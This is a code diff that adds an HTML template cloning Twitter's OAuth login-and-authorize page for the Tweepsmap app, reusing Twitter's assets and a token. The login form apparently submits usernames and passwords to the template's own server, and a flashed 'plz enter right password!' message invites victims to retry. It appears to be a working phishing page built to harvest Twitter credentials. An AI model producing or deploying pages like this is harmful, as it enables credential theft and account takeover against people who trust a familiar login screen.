@@ -1,0 +1,153 @@
+
+<!DOCTYPE html>
+<html lang="en"  dir="ltr"
+      class="">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
+    <title>Twitter / Authorize an application</title>
+    <link rel="stylesheet" type="text/css" media="screen" href="https://abs-0.twimg.com/login/tfw-base.3baf723b92aa68729f921c77ca3e3c1315116392.css">
+    <!--[if (IEMobile) & (lt IE 9)]>
+      <link href="https://abs-0.twimg.com/login/phoenix-iemobile.49b26ac21d4736060188b5b79bbabc69ca8ef790.css" media="screen" rel="stylesheet" type="text/css" />
+    <![endif]-->
+        <meta name="mswebdialog-title" content="Twitter"><meta name="mswebdialog-logo" content="https://abs.twimg.com/favicons/win8-auth-60.png"><meta name="mswebdialog-header-color" content="#202020"><meta name="mswebdialog-newwindowurl" content="*">
+
+
+      <script src="//abs-0.twimg.com/login/base.c03d8aaa91f708e544dab495c1de806582ae1f1f.js" type="text/javascript"></script>
+      <script src="//abs-0.twimg.com/login/authorize_page.c4edf9ccaf94a42b6963991691957aaa827aa56b.js" type="text/javascript"></script>
+  </head>
+  
+  
+  <body class="oauth write tfw en logged-out    noloki">
+
+{% with messages = get_flashed_messages() %}
+        {% if messages %}
+             {% for message in messages %}
+             <div class="alert alert-warning alert-dismissible fade show" role="alert">
+  <strong>plz enter right password!</strong> You should check in on some of those fields below.
+  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+    <span aria-hidden="true"></span>
+  </button>
+</div>
+              {% endfor %}
+        {% endif %}
+    {% endwith %}
+    <div id="header" role="banner">
+      <div class="bar">
+        <h1 class="logo">
+          <a class="alternate-context" href="https://twitter.com/home">Twitter</a>
+        </h1>
+
+        <div id="not-logged-in">
+              <a href="https://twitter.com/signup?context=oauth&amp;oauth_token=1meDWAAAAAAAEq3IAAABbqIQkNo" class="register alternate-context">Sign up for Twitter</a>
+
+        </div>
+      </div>
+    </div>
+
+    <div id="bd" role="main">
+          
+
+
+
+    <div class="auth">
+      <h2>Authorize Tweepsmap to access your account?</h2>
+
+      <div class="app-info" role="content-info" tabindex="0">
+  <h3>
+    <img alt="" class="app-icon" src="https://pbs.twimg.com/app_img/679783396394971136/qUIJFWLd?format=png&amp;name=73x73" title="Tweepsmap by Tweepsmap">
+    Tweepsmap
+  </h3>
+  <dl>
+      <dt class="dev">Developer</dt>
+      <dd class="dev">By Tweepsmap</dd>
+      <dt class="url">Application URL</dt>
+      <dd class="url">tweepsmap.com</dd>
+      <dt class="notes">About this app</dt>
+      <dd class="notes"><p>intelligent publishing, communications and brand management platform. Precision segmentation actionable audience analytics. Will never Tweet without your permission http://tweepsmap.com/Info/FAQ#faq6</p></dd>
+      <dt class="terms">Privacy Policy</dt>
+      <dd class="terms"><p><a href="https://tweepsmap.com/account/privacy">Privacy Policy</a></p></dd>
+      <dt class="terms">Terms and Conditions</dt>
+      <dd class="terms"><p><a href="https://tweepsmap.com/account/terms">Terms and Conditions</a></p></dd>
+
+  </dl>
+</div>
+
+      <form action="" id="oauth_form" method="post" target="_self">
+        <div>
+          <input name="authenticity_token" type="hidden" value="b628196069ef406397809cff1e058c62722957b1">
+          <input name="redirect_after_login" type="hidden" value="https://api.twitter.com/oauth/authorize?oauth_token=1meDWAAAAAAAEq3IAAABbqIQkNo">
+        </div>
+
+        <input id="oauth_token" name="oauth_token" type="hidden" value="1meDWAAAAAAAEq3IAAABbqIQkNo">
+
+          <fieldset class="sign-in">
+  <legend>Log in to Twitter</legend>
+  <div class="row user ">
+    <input aria-required="true" autocapitalize="off" autocorrect="off"  class="text" id="username_or_email" name="email" type="text" placeholder="Username or email">
+  </div>
+  <div class="row password ">
+    <input aria-required="true" class="password text" autofocus="autofocus" id="password" name="password" type="password" placeholder="Password" value="">
+  </div>
+  <p>
+    <input type="checkbox" name="remember_me" id="remember" value="1">
+    <label for="remember">Remember me</label>
+    &middot;
+    <a href="https://twitter.com/account/resend_password" class="alternate-context" target="_blank">Forgot password?</a>
+  </p>
+    <input type="hidden" name="ui_metrics" autocomplete="off">
+    <script src="https://twitter.com/i/js_inst?c_name=ui_metrics" async></script>
+</fieldset>
+
+
+        <fieldset class="buttons">
+          <legend>Authorize Tweepsmap access to use your account?</legend>
+          <input type="submit" value="Authorize app" name="submit class="submit button selected" id="allow">
+
+            <input class="submit button" id="cancel" name="cancel" type="submit" value="Cancel">
+
+        </fieldset>
+      </form>
+
+      
+<div class="permissions allow">
+  <p><strong>This application will be able to:</strong></p>
+   <ul class="permissions allow">
+      <li>See Tweets from your timeline (including protected Tweets) as well as your Lists and collections.</li>
+      <li>See your Twitter profile information and account settings.</li>
+      <li>See accounts you follow, mute, and block.</li>
+      <li>Follow and unfollow accounts for you.</li>
+      <li>Update your profile and account settings.</li>
+      <li>Post and delete Tweets for you, and engage with Tweets posted by others (Like, un-Like, or reply to a Tweet, Retweet, etc.) for you.</li>
+      <li>Create, manage, and delete Lists and collections for you.</li>
+      <li>Mute, block, and report accounts for you.</li>
+</ul>
+
+
+</div>
+
+
+
+      <div>
+  <p><small>Learn more about third-party app permissions in the <a href="https://help.twitter.com/managing-your-account/connect-or-revoke-access-to-third-party-apps" target="_blank">Help Center</a>.</small></p>
+</div>
+
+
+    </div>
+
+    </div>
+
+
+  <div class="footer" role="navigation"><div id="ft">
+    
+        
+  <p class="tip">We recommend reviewing the app’s terms and privacy policy to understand how it will use data from your Twitter account. You can revoke access to any app at any time from the <a href="https://twitter.com/settings/applications" target="_blank">Apps and sessions</a> section of your Twitter account settings.</p>
+  <p><small>By authorizing an app you continue to operate under Twitter’s <a href="https://twitter.com/tos" target="_blank">Terms of Service</a>. In particular, some usage information will be shared back with Twitter. For more, see our <a href="https://twitter.com/privacy" target="_blank">Privacy Policy</a>.</small></p>
+
+
+
+  </div></div>
+
+  </body>
+</html>
